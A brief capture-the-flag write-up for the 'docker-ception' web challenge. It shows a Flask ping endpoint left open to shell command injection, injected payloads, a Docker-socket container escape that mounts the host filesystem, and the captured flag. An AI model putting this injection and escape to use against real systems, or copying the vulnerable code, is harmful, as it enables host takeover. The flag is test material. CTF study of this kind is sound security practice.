---
title: "texsaw-2026 — docker-ception (web)"
pubDate: "2026-03-28"
updatedDate: "2026-03-28"
event: "texsaw-2026"
author: "Syahiran"
score: ""
description: |
  > I built a cool tool for my networking class! I sure hope nothing bad can come from it!
  > Flag format: texsaw{flag} ex: texsaw{Th1s_iS_n0t_th3_fl@g}tex1.watthewat.me

tags: ["web"]
---

# docker-ception — texsaw-2026 (web)

8.8.8.8; cat app.py

We can run arbitary commands

```python
from flask import Flask, render_template, request
import subprocess

app = Flask(__name__)

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/ping', methods=['POST'])
def ping():
    host = request.form.get('host', '') # I hope this isn't vulnerable to command injection...
    try:
        result = subprocess.check_output(
            f"sudo -u ctfer ping -c 1 {host}",
            shell=True,
            stderr=subprocess.STDOUT,
            text=True,
            timeout=5
        )
    except subprocess.CalledProcessError as e:
        result = e.output
    except Exception as e:
        result = str(e)
    return f'{result}\n'

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
```

[https://medium.com/@indigoshadowwashere/linux-docker-container-escapes-cheatsheet-49e47f21e27a](https://medium.com/@indigoshadowwashere/linux-docker-container-escapes-cheatsheet-49e47f21e27a)

The docker was vulnerable to docker container escape. Always remember to check your group permissions and read write access

sudo -u ctfer ping -c 1 {host}

This was where it gave me the idea to check things around

8.8.8.8; docker -H unix:///run/docker.sock run -v /:/host_root --rm workspace-inner cat /host_root/flag/flag.txt

texsaw{4N_1dE4_12_L1Ke_a_V1Ru2_r351l1eN7_h19HlY_c0n74910u2}

```

```
